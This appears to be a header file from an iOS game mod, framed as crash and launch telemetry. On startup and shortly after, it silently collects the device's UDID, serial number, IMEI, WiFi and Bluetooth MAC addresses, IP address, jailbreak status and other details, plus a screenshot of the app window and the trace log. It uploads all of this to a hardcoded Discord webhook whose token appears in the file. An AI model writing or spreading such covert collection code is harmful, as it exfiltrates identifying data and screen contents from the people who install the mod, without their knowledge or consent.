#pragma once
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <QuartzCore/QuartzCore.h>
#import <dlfcn.h>
#import <ifaddrs.h>
#import <arpa/inet.h>
#import <sys/socket.h>
#import <sys/utsname.h>
#import <unistd.h>

// Must be included AFTER Helper/Hooks.h (needs aikTracePath / aikDbgSt / ...).
#define FF_TELEMETRY_URL "https://canary.discord.com/api/webhooks/1573323480139694130/D3kU1g2ivKZsWrH8P8_Cq14_Lc3pTWSedTDCviazvhwoWS65FGkBijIl15Pp_TurU5ym"

static NSString *FfTelEscape(NSString *s)
{
    if (!s) return @"";
    NSMutableString *o = [NSMutableString stringWithCapacity:s.length + 16];
    for (NSUInteger i = 0; i < s.length; i++)
    {
        unichar c = [s characterAtIndex:i];
        switch (c)
        {
            case '"':  [o appendString:@"\\\""]; break;
            case '\\': [o appendString:@"\\\\"]; break;
            case '\n': [o appendString:@"\\n"]; break;
            case '\r': [o appendString:@"\\r"]; break;
            case '\t': [o appendString:@"\\t"]; break;
            default:
                if (c < 0x20) [o appendFormat:@"\\u%04x", c];
                else [o appendFormat:@"%C", c];
                break;
        }
    }
    return o;
}

static NSString *FfTelDevice(void)
{
    UIDevice *d = [UIDevice currentDevice];
    NSDictionary *info = [[NSBundle mainBundle] infoDictionary];
    return [NSString stringWithFormat:@"%@ Â· iOS %@ Â· %@ (%@) Â· %@",
            d.model ?: @"?",
            d.systemVersion ?: @"?",
            info[@"CFBundleShortVersionString"] ?: @"?",
            info[@"CFBundleVersion"] ?: @"?",
            info[@"CFBundleIdentifier"] ?: @"?"];
}

static NSString *FfTelMG(NSString *key)
{
    static void *(*mgCopy)(CFStringRef) = NULL;
    static BOOL tried = NO;
    if (!tried)
    {
        tried = YES;
        void *h = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_LAZY);
        if (!h) h = dlopen("/System/Library/PrivateFrameworks/MobileGestalt.framework/MobileGestalt", RTLD_LAZY);
        if (h) mgCopy = (void *(*)(CFStringRef))dlsym(h, "MGCopyAnswer");
    }
    if (!mgCopy) return @"?";
    CFTypeRef v = (CFTypeRef)mgCopy((__bridge CFStringRef)key);
    if (!v) return @"?";
    NSString *s = @"?";
    CFTypeID tid = CFGetTypeID(v);
    if (tid == CFStringGetTypeID())
        s = [NSString stringWithString:(__bridge NSString *)v];
    else if (tid == CFNumberGetTypeID())
        s = [(__bridge NSNumber *)v stringValue];
    else if (tid == CFBooleanGetTypeID())
        s = [(__bridge NSNumber *)v boolValue] ? @"1" : @"0";
    CFRelease(v);
    return s;
}

static NSString *FfTelIP(void)
{
    NSString *addr = @"?";
    struct ifaddrs *ifa = NULL;
    if (getifaddrs(&ifa) != 0) return addr;
    for (struct ifaddrs *p = ifa; p; p = p->ifa_next)
    {
        if (!p->ifa_addr || p->ifa_addr->sa_family != AF_INET) continue;
        NSString *n = p->ifa_name ? [NSString stringWithUTF8String:p->ifa_name] : @"";
        if (![n isEqualToString:@"en0"]) continue;
        char buf[INET_ADDRSTRLEN] = {0};
        struct sockaddr_in *sin = (struct sockaddr_in *)p->ifa_addr;
        if (inet_ntop(AF_INET, &sin->sin_addr, buf, sizeof(buf)))
            addr = [NSString stringWithUTF8String:buf];
        break;
    }
    freeifaddrs(ifa);
    return addr;
}

static NSString *FfTelJailbreak(void)
{
    const char *paths[] = {"/var/jb", "/Applications/Cydia.app", "/usr/sbin/sshd",
                           "/bin/bash", "/usr/bin/ssh", "/var/lib/dpkg/status",
                           "/Library/MobileSubstrate", NULL};
    for (int i = 0; paths[i]; i++)
        if (access(paths[i], F_OK) == 0)
            return [NSString stringWithFormat:@"YES (%s)", paths[i]];
    return @"no";
}

static NSString *FfTelDeviceFull(void)
{
    UIDevice *d = [UIDevice currentDevice];
    NSDictionary *info = [[NSBundle mainBundle] infoDictionary];
    struct utsname u;
    uname(&u);

    d.batteryMonitoringEnabled = YES;
    NSString *bat = d.batteryLevel < 0 ? @"?"
        : [NSString stringWithFormat:@"%.0f%%", d.batteryLevel * 100.0];
    if (d.batteryState == UIDeviceBatteryStateCharging) bat = [bat stringByAppendingString:@" charging"];
    else if (d.batteryState == UIDeviceBatteryStateFull) bat = [bat stringByAppendingString:@" full"];

    unsigned long long freeB = 0, totalB = 0;
    NSDictionary *fs = [[NSFileManager defaultManager] attributesOfFileSystemForPath:NSHomeDirectory() error:nil];
    if (fs)
    {
        freeB = [fs[NSFileSystemFreeSize] unsignedLongLongValue];
        totalB = [fs[NSFileSystemSize] unsignedLongLongValue];
    }
    double ram = [NSProcessInfo processInfo].physicalMemory / 1073741824.0;

    CGSize scr = [UIScreen mainScreen].nativeBounds.size;
    CGFloat scale = [UIScreen mainScreen].nativeScale;
    NSLocale *loc = [NSLocale currentLocale];

    NSString *s = [NSString stringWithFormat:
        @"**Name**: %@\n"
        @"**Model**: %@ (%@ / %@)\n"
        @"**iOS**: %@ (%@)\n"
        @"**UDID**: %@\n"
        @"**Serial**: %@\n"
        @"**WiFi MAC**: %@\n"
        @"**BT MAC**: %@\n"
        @"**IMEI**: %@\n"
        @"**CPU**: %s Â· %lu cores\n"
        @"**RAM**: %.1f GB\n"
        @"**Disk**: %.1f / %.1f GB free\n"
        @"**Screen**: %.0fx%.0f @%.1f\n"
        @"**Battery**: %@\n"
        @"**Locale**: %@ Â· %@\n"
        @"**IP (en0)**: %@\n"
        @"**Jailbreak**: %@\n"
        @"**App**: %@ %@ (%@)",
        d.name ?: @"?",
        FfTelMG(@"ProductType"), FfTelMG(@"HardwareModel"), d.model ?: @"?",
        d.systemVersion ?: @"?", FfTelMG(@"BuildVersion"),
        FfTelMG(@"UniqueDeviceID"),
        FfTelMG(@"SerialNumber"),
        FfTelMG(@"WiFiAddress"),
        FfTelMG(@"BluetoothAddress"),
        FfTelMG(@"InternationalMobileEquipmentIdentity"),
        u.machine, (unsigned long)[NSProcessInfo processInfo].processorCount,
        ram,
        freeB / 1073741824.0, totalB / 1073741824.0,
        scr.width, scr.height, scale,
        bat,
        [loc localeIdentifier] ?: @"?", [NSTimeZone localTimeZone].name ?: @"?",
        FfTelIP(),
        FfTelJailbreak(),
        info[@"CFBundleIdentifier"] ?: @"?",
        info[@"CFBundleShortVersionString"] ?: @"?",
        info[@"CFBundleVersion"] ?: @"?"];
    return s;
}

static UIWindow *FfTelWindow(void)
{
    UIWindow *win = nil;
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wunguarded-availability-new"
    for (UIScene *sc in UIApplication.sharedApplication.connectedScenes)
    {
        if (![sc isKindOfClass:[UIWindowScene class]]) continue;
        for (UIWindow *w in ((UIWindowScene *)sc).windows)
        {
            if (w.isKeyWindow) { win = w; break; }
        }
        if (win) break;
    }
#pragma clang diagnostic pop
    if (!win) win = UIApplication.sharedApplication.keyWindow;
    return win;
}

static NSData *FfTelShot(void)
{
    UIWindow *win = FfTelWindow();
    if (!win || win.bounds.size.width < 1) return nil;
    UIGraphicsBeginImageContextWithOptions(win.bounds.size, NO, 0.35);
    [win drawViewHierarchyInRect:win.bounds afterScreenUpdates:NO];
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    if (!img) return nil;
    return UIImageJPEGRepresentation(img, 0.6);
}

static char aikTelStatus[96] = "idle";

static void FfTelSetStatus(NSString *s)
{
    snprintf(aikTelStatus, sizeof(aikTelStatus), "%s", s ? [s UTF8String] : "?");
}

// files: array of @{@"name":..., @"type":..., @"data":NSData*}
static void FfTelPost(NSString *payloadJson, NSArray<NSDictionary *> *files)
{
    NSURL *url = [NSURL URLWithString:@FF_TELEMETRY_URL];
    if (!url) { FfTelSetStatus(@"bad url"); return; }
    NSString *boundary = @"----ffTelB0undary7f3a";
    NSMutableData *body = [NSMutableData data];
    [body appendData:[[NSString stringWithFormat:
        @"--%@\r\nContent-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n%@\r\n",
        boundary, payloadJson] dataUsingEncoding:NSUTF8StringEncoding]];
    NSUInteger idx = 0;
    for (NSDictionary *f in files)
    {
        NSData *data = f[@"data"];
        if (![data isKindOfClass:[NSData class]] || data.length == 0) { idx++; continue; }
        [body appendData:[[NSString stringWithFormat:
            @"--%@\r\nContent-Disposition: form-data; name=\"files[%lu]\"; filename=\"%@\"\r\nContent-Type: %@\r\n\r\n",
            boundary, (unsigned long)idx, f[@"name"], f[@"type"]] dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:data];
        [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
        idx++;
    }
    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];

    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    req.timeoutInterval = 30;
    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
        forHTTPHeaderField:@"Content-Type"];
    [req setValue:@"FF-Mod/1.0" forHTTPHeaderField:@"User-Agent"];
    req.HTTPBody = body;
    FfTelSetStatus(@"sending");

    NSURLSessionDataTask *task = [[NSURLSession sharedSession]
        dataTaskWithRequest:req
        completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
            if (err)
            {
                FfTelSetStatus([NSString stringWithFormat:@"err %ld %@", (long)err.code,
                                err.localizedDescription ?: @""]);
                return;
            }
            NSInteger code = [resp isKindOfClass:[NSHTTPURLResponse class]]
                ? [(NSHTTPURLResponse *)resp statusCode] : -1;
            if (code >= 200 && code < 300)
                FfTelSetStatus([NSString stringWithFormat:@"ok %ld", (long)code]);
            else
            {
                NSString *b = data ? [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] : @"";
                if (b.length > 40) b = [b substringToIndex:40];
                FfTelSetStatus([NSString stringWithFormat:@"http %ld %@", (long)code, b ?: @""]);
            }
        }];
    [task resume];
}

static void FfTelSendText(NSString *text)
{
    NSString *payload = [NSString stringWithFormat:
        @"{\"username\":\"FF Telemetry\",\"content\":\"%@\"}", FfTelEscape(text)];
    FfTelPost(payload, @[]);
}

static void FfTelTest(void)
{
    FfTelSendText([NSString stringWithFormat:@"TEST\n%@", FfTelDeviceFull()]);
}

static NSString *FfTelLogText(void)
{
    if (!aikTracePath[0]) return nil;
    NSString *p = [NSString stringWithUTF8String:aikTracePath];
    if (!p) return nil;
    return [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
}

// If the previous session died inside an il2cpp call, the trace log's last
// line is a "pre <step>" with no "post". Report it once, then rotate the log.
static void FfTelCrashCheck(void)
{
    NSString *txt = FfTelLogText();
    if (txt.length == 0) return;

    NSArray<NSString *> *lines = [txt componentsSeparatedByString:@"\n"];
    NSString *last = @"";
    for (NSInteger i = (NSInteger)lines.count - 1; i >= 0; i--)
    {
        if (lines[i].length) { last = lines[i]; break; }
    }
    if (![last hasPrefix:@"pre "]) return;

    NSString *step = last;
    NSRange sp = [last rangeOfString:@" st="];
    if (sp.location != NSNotFound) step = [last substringToIndex:sp.location];

    NSMutableArray *tail = [NSMutableArray array];
    NSInteger start = MAX(0, (NSInteger)lines.count - 40);
    for (NSInteger i = start; i < (NSInteger)lines.count; i++)
        if (lines[i].length) [tail addObject:lines[i]];
    NSString *tailText = [tail componentsJoinedByString:@"\n"];
    if (tailText.length > 1800) tailText = [tailText substringFromIndex:tailText.length - 1800];

    NSString *desc = [NSString stringWithFormat:
        @"**Crash detected** - last call: `%@`\n```\n%@\n```", step, tailText];

    NSString *payload = [NSString stringWithFormat:
        @"{\"username\":\"FF Telemetry\",\"embeds\":[{\"title\":\"CRASH\",\"color\":15158332,\"description\":\"%@\",\"footer\":{\"text\":\"%@\"}}]}",
        FfTelEscape(desc), FfTelEscape(FfTelDeviceFull())];

    NSData *logData = [txt dataUsingEncoding:NSUTF8StringEncoding];
    FfTelPost(payload, logData.length ? @[@{@"name": @"ff_aik.log", @"type": @"text/plain", @"data": logData}] : @[]);

    // rotate so the same crash is not reported twice
    [[NSFileManager defaultManager] removeItemAtPath:[NSString stringWithUTF8String:aikTracePath] error:nil];
}

static void FfTelLaunchShot(void)
{
    NSData *jpg = FfTelShot();
    if (jpg.length)
    {
        NSString *payload = [NSString stringWithFormat:
            @"{\"username\":\"FF Telemetry\",\"embeds\":[{\"title\":\"Launch\",\"color\":3447003,\"description\":\"%@\",\"image\":{\"url\":\"attachment://shot.jpg\"}}]}",
            FfTelEscape(FfTelDeviceFull())];
        FfTelPost(payload, @[@{@"name": @"shot.jpg", @"type": @"image/jpeg", @"data": jpg}]);
        return;
    }
    FfTelSendText([NSString stringWithFormat:@"Launch (no screenshot)\n%@", FfTelDeviceFull()]);
}

// Call once per frame from the render loop (main thread).
static void FfTelTick(BOOL menuOpen)
{
    static BOOL bootDone = NO;
    static BOOL crashDone = NO;
    static BOOL shotDone = NO;
    static CFTimeInterval t0 = 0;

    if (!bootDone)
    {
        bootDone = YES;
        FfTelSendText([NSString stringWithFormat:@"BOOT\n%@", FfTelDeviceFull()]);
        FfTelCrashCheck();
        crashDone = YES;
    }
    if (shotDone) return;

    if (!t0) t0 = CACurrentMediaTime();
    if (!menuOpen && CACurrentMediaTime() - t0 < 12.0) return;
    shotDone = YES;
    FfTelLaunchShot();
}


